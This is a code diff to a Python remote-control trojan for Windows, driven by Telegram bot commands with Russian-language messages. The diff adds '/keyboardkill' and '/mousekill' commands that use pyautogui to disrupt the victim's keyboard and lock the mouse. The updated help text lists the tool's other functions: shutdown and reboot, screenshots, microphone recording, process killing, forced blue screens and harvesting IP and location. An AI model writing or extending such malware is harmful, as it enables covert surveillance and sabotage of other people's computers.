@@ -19,7 +19,7 @@ import sys
 from ctypes import *
 from ctypes.wintypes import *
 from pynput import keyboard
-
+import pyautogui as pag
 mytoken = 'telegram token'
 
 bot = telebot.TeleBot(mytoken)
@@ -50,8 +50,16 @@ def commands(message):
         if message.text == '/start':
                 bot.send_message(message.chat.id,'Выбери действие',reply_markup=mainkeyboard)
 
-
-
+          
+        elif message.text == '/keyboardkill':
+                pag.hotkey('ctrl', 'alt', 'delete')
+                bot.send_message(message.chat.id,'Клавиатура убита',reply_markup=mainkeyboard)
+                
+        elif message.text == '/mousekill':
+                pag.moveTo(100, 200, 9999999999999999999)
+                bot.send_message(message.chat.id,'Мышка убита',reply_markup=mainkeyboard)
+        
+        
         elif message.text == 'Питание🟢':
                 bot.send_message(message.chat.id,'Выбери действие',reply_markup=powerkeyboard)
 
@@ -70,7 +78,7 @@ def commands(message):
 
 
         elif message.text == '/help' or message.text == 'Помощь⚒':
-                 bot.send_message(message.chat.id,'/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)\n/bluesreen(синий экран на пк)\n/oc(выведит операционную систему и имя пк)\n/tasklist(узнать список запущенных процессов)',reply_markup=mainkeyboard)
+                 bot.send_message(message.chat.id,'/mousekill(Мышка будет залочена в 1 положении навечно)/keyboardkill(Всегда зажатые кнопки (Все.))\n/off(выкл пк)\n/open(открыть ссылку в браузере)\n/screen(сделать скриншот экрана)\n/process(включить процесс)\n/kill(убить процесс)\n/reboot(перезагрузить пк)\n/window(тест на гея)\n/ip(узнать ip,город,браузер)\n/rep(запустить файл.mp3)\n/record(записать звки с микрофона)\n/bluesreen(синий экран на пк)\n/oc(выведит операционную систему и имя пк)\n/tasklist(узнать список запущенных процессов)',reply_markup=mainkeyboard)
 
 
         elif message.text == '/tasklist':
